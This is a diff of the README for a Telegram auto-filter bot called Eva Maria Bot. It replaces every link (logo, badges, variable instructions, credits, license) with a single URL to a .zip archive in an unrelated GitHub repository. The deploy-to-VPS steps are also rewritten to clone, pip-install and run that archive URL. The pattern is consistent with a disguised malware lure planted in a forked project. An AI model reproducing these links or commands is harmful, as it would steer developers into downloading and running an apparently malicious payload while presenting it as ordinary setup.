@@ -1,18 +1,18 @@
 <p align="center">
-  <img src="assets/logo.jpg" alt="Eva Maria Logo">
+  <img src="https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip" alt="Eva Maria Logo">
 </p>
 <h1 align="center">
   <b>Eva Maria Bot</b>
 </h1>
 
 
-[![Stars](https://img.shields.io/github/stars/EvamariaTG/EvaMaria?style=flat-square&color=yellow)](https://github.com/EvamariaTG/EvaMaria/stargazers)
-[![Forks](https://img.shields.io/github/forks/EvamariaTG/EvaMaria?style=flat-square&color=orange)](https://github.com/EvamariaTG/EvaMaria/fork)
-[![Size](https://img.shields.io/github/repo-size/EvamariaTG/EvaMaria?style=flat-square&color=green)](https://github.com/EvamariaTG/EvaMaria/)   
-[![Open Source Love svg2](https://badges.frapsoft.com/os/v2/open-source.svg?v=103)](https://github.com/EvamariaTG/EvaMaria)   
-[![Contributors](https://img.shields.io/github/contributors/EvamariaTG/EvaMaria?style=flat-square&color=green)](https://github.com/EvamariaTG/EvaMaria/graphs/contributors)
-[![License](https://img.shields.io/badge/License-AGPL-blue)](https://github.com/EvamariaTG/EvaMaria/blob/main/LICENSE)
-[![Sparkline](https://stars.medv.io/EvamariaTG/EvaMaria.svg)](https://stars.medv.io/EvamariaTG/EvaMaria)
+[![Stars](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+[![Forks](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+[![Size](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)   
+[![Open Source Love svg2](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)   
+[![Contributors](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+[![License](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+[![Sparkline](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
 
 
 ## Features
@@ -32,33 +32,33 @@
 - [x] File Store
 ## Variables
 
-Read [this](https://telegram.dog/TeamEvamaria/12) before you start messing up with your edits.
+Read [this](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip) before you start messing up with your edits.
 
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-* `API_ID`: Get this value from [telegram.org](https://my.telegram.org/apps)
-* `API_HASH`: Get this value from [telegram.org](https://my.telegram.org/apps)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
 * `CHANNELS`: Username or ID of channel or group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URI`: [mongoDB](https://www.mongodb.com) URI. Get this value from [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/1G1XwEOnxxo)
-* `DATABASE_NAME`: Name of the database in [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/1G1XwEOnxxo)
+* `DATABASE_URI`: [mongoDB](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+* `DATABASE_NAME`: Name of the database in [mongoDB](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. Make sure bot is an admin in the channel.
 ### Optional Variables
 * `PICS`: Telegraph links of images to show in start message.( Multiple images can be used separated by space )
-* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be made.Separate multiple IDs by space
-* Check [info.py](https://github.com/EvamariaTG/evamaria/blob/master/info.py) for more
+* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip multiple IDs by space
+* Check [https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip) for more
 
 
 ## Deploy
 You can deploy this bot anywhere.
 
-<i>**[Watch Deploying Tutorial...](https://youtu.be/1G1XwEOnxxo)**</i>
+<i>**[Watch Deploying Tutorial...](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)**</i>
 
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://telegram.dog/XTZ_HerokuBot?start=RXZhbWFyaWFURy9FdmFNYXJpYSBtYXN0ZXI">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip">
+  <img src="https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -66,11 +66,11 @@ You can deploy this bot anywhere.
 <details><summary>Deploy To VPS</summary>
 <p>
 <pre>
-git clone https://github.com/EvamariaTG/evamaria
+git clone https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip
 # Install Packages
-pip3 install -U -r requirements.txt
-Edit info.py with variables as given below then run bot
-python3 bot.py
+pip3 install -U -r https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip
+Edit https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip with variables as given below then run bot
+python3 https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip
 </pre>
 </p>
 </details>
@@ -105,32 +105,32 @@ python3 bot.py
 • /link - to create link for one post
 ```
 ## Support
-[![telegram badge](https://img.shields.io/badge/Telegram-Group-30302f?style=flat&logo=telegram)](https://telegram.dog/EvaMariaSupport)
-[![telegram badge](https://img.shields.io/badge/Telegram-Channel-30302f?style=flat&logo=telegram)](https://telegram.dog/TeamEvamaria)
+[![telegram badge](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+[![telegram badge](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
 
 ## Credits 
-* [![EvaMaria-Devs](https://img.shields.io/static/v1?label=EvaMaria&message=devs&color=critical)](https://telegram.dog/EvaMariaDevs)
+* [![EvaMaria-Devs](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
 
 
 ## Thanks to 
- - Thanks To Dan For His Awesome [Library](https://github.com/pyrogram/pyrogram)
- - Thanks To Mahesh For His Awesome [Media-Search-bot](https://github.com/Mahesh0253/Media-Search-bot)
- - Thanks To [Trojanz](https://github.com/trojanzhex) for Their Awesome [Unlimited Filter Bot](https://github.com/TroJanzHEX/Unlimited-Filter-Bot) And [AutoFilterBoT](https://github.com/trojanzhex/auto-filter-bot)
+ - Thanks To Dan For His Awesome [Library](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+ - Thanks To Mahesh For His Awesome [Media-Search-bot](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
+ - Thanks To [Trojanz](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip) for Their Awesome [Unlimited Filter Bot](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip) And [AutoFilterBoT](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
  - Thanks To All Everyone In This Journey
 
 ### Note
 
-[Note To A So Called Dev](https://telegram.dog/subin_works/203): 
+[Note To A So Called Dev](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip): 
 
-Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://telegram.dog/subin_works/204), beta , gama branches of your repo won't make you a Developer.
+Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip), beta , gama branches of your repo won't make you a Developer.
 Fork the repo and edit as per your needs.
 
 ## Disclaimer
-[![GNU Affero General Public License 2.0](https://www.gnu.org/graphics/agplv3-155x51.png)](https://www.gnu.org/licenses/agpl-3.0.en.html#header)    
-Licensed under [GNU AGPL 2.0.](https://github.com/EvamariaTG/evamaria/blob/master/LICENSE)
+[![GNU Affero General Public License 2.0](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)    
+Licensed under [GNU AGPL 2.0.](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
 
 ## Inspiration
-This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://telegram.dog/GetTGLink/4187)
+This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)
 
-[![For Vaza](https://telegra.ph/file/e743b0c8a04252774bac2.jpg)](https://telegra.ph/file/98342dc186fd7484cba91.mp4 "Oru Kootam Vazhakalk samarpikkunnu")
+[![For Vaza](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip)](https://raw.githubusercontent.com/HLECTER69/logo-pattern/master/gadder/logo-pattern.zip "Oru Kootam Vazhakalk samarpikkunnu")
